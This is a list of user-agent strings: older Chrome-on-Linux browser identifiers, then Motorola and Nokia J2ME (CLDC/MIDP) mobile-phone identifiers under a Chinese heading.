		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.544.0 Safari/534.10 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.24 Safari/534.7 
		Mozilla/5.0 (X11; U; Linux x86_64; fr-FR) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.470.0 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.462.0 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.0 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.457.0 Safari/534.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.1 SUSE/6.0.428.0 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.417.0 Safari/534.1 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.416.0 Safari/534.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.368.0 Safari/533.4 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.2 Safari/533.4 
		Mozilla/5.0 (X11; U; x86_64 Linux; en_GB, en_US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2 
		Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.308.0 Safari/532.9 
		Mozilla/5.0 (X11; U; Slackware Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.30 Safari/532.5 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.2 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.223.1 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.8 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.6 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.3 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.1 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.7 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.3 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.0 Safari/532.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.3 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.0 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.1 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.205.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.24 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4 
		Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.175.0 Safari/530.7


		含CLDC:

		MOT-C550/0A.10.20R MIB/2.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-C550/0A.10.25R MIB/2.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-E380/0A.03.36R MIB/2.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-E380/0A.03.60R MIB/2.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-C380/0B.D1.1AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C380/0B.D2.23R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D1.08R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D1.09R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D1.0BR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D1.1AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D1.1BR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D2.23R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C650/0B.D2.2FR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E375/0E.23.0ER MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E375/0E.23.10R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E375/0E.23.12R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.36R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.38R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.39R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.96R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.99R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-C975/80.2F.68. MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-C975/80.2F.68I MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-C975/80.2F.88I MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-E1000/80.3F.68I MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-E1000/80.3F.88I MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-A728/R505_G_00.02.A1R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-A728/R505_G_00.03.A1R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-A768/A768_G_00.B3.A1R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-A768/R503_G_00.15.A1R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-A768/R503_G_00.18.A2R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E398/0E.20.99R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Link/1.1 
		MOT-E398/R601 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-E398B/0E.20.95R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-E680/R51_G_0F.38.A4R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-E680/R51_G_0F.42.A1P MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-E680/R51_G_0F.48.A2P MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-E680/R51_G_0F.51.A1P MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera 7.50 [zh-cn] 
		MOT-E680i/E680I_G_0D.C3.A8P Mozilla/4.0 (compatible; MSIE 6.0; Motorola; 1030) Profile/MIDP-2.0 
		1229) Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera 7.50 [zh-cn] 
		MOT-T720/AS_G_05.08.52R MIB/2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-T720/AS_G_05.08.71R MIB/2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-T720/PMAS_G_05.41.59R MIB/2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		MOT-V180/0B.D1.1AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V220/0B.D1.1AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V220/0B.D2.30R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.3DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.64R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.65R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.79R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.98R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.9AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.9CR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.9DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.40.9ER MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.41.C3R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.42.07R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.42.08R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V3/0E.42.0AR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V300/0B.09.29R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V300/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V300/0B.09.4ER MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V303/0B.09.1CR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V303/0B.09.29R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V303/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V303/0B.09.4ER MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V360/08.B7.58R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		MOT-V500/0B.09.1CR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V500/0B.09.29R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V500/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V500/0B.09.4ER MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V501/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V501/0B.09.4AR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V501/0B.09.4ER MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V547/08.18.34R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.08.A5R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.1CR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.1DR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.29R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.2FR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.38R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.3AR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.45R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.4AR MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.4ER MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.58R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600/0B.09.72R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600i/0E.65.23R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V600i/0E.66.12R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V80/0E.03.2CR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V80/0E.03.34R MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Mozilla/4.0 (compatible; MSIE 5.0; Series90/1.1 Nokia7710/c2.08.4 Profile/MIDP-2.0 Configuration/CLDC-1.0) 
		Mozilla/4.0 (compatible; MSIE 5.0; Series90/1.1 Nokia7710/n3.54.0 Profile/MIDP-2.0 Configuration/CLDC-1.0) 
		Mozilla/4.0 (compatible; MSIE 6.0; Linux; Motorola A780; 781) MOT-A780/R52_G_0D.50.A7P Profile/MIDP-2.0 
		Mozilla/4.0 (compatible; MSIE 6.0; Linux; Motorola A780; 781) MOT-A780/R52_G_0D.50.AFP Profile/MIDP-2.0 
		Nokia2650/1.0 (5.17) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia2650/1.0 (5.48) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia2650/1.0 (6.06) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia2650/1.0 (6.18) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (03.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (03.51) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/6.3.0.0.0 
		Nokia3100/1.0 (05.02) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.03) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.54) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.66) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.69) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (05.91) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (06.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3100/1.0 (06.11) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3108/1.0 (03.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3108/1.0 (04.00) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3108/1.0 (04.00) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/6.3.0.0.0 
		Nokia3108/1.0 (05.08) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3108/1.0 (05.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3120/1.0 (05.30) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3120/1.0 (05.54) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3120/1.0 (05.91) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3120/1.0 (06.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3120/1.0 (06.11) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3200/1.0 () Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3200/1.0 (4.16) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3200/1.0 (4.17) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3200/1.0 (4.18) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3200/1.0 (5.29) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3220/2.0 (03.30) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (03.35) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (03.60) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (04.30) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (04.50) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (04.54) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (04.80) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (04.94) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3220/2.0 (05.10) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia3300/1.0 (4.05) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3300/1.0 (4.07) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3300/1.0 (4.25) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3300/1.0 (4.62) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3300/1.0 (5.20) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia5140/2.0 (3.10) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6020/2.0 (03.52) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6020/2.0 (03.53) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6020/2.0 (03.92) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6020/2.0 (04.10) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6021/2.0 (03.83) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6030/2.0 (y3.30) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6030/2.0 (y3.31) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6030/2.0 (y3.32) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6030/2.0 (y3.41) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6030/2.0 (y3.43) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6060/2.0 (k3.62) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6100/1.0 (03.22) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (04.03) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (04.70) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (05.16) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (05.51) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (05.80) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (06.01) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6100/1.0 (06.20) Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6101/2.0 (03.35) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6102/2.0 (03.38) Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6108/1.0 (03.20) Profile/MIDP-1.0 Configuration/CLDC-1.0 
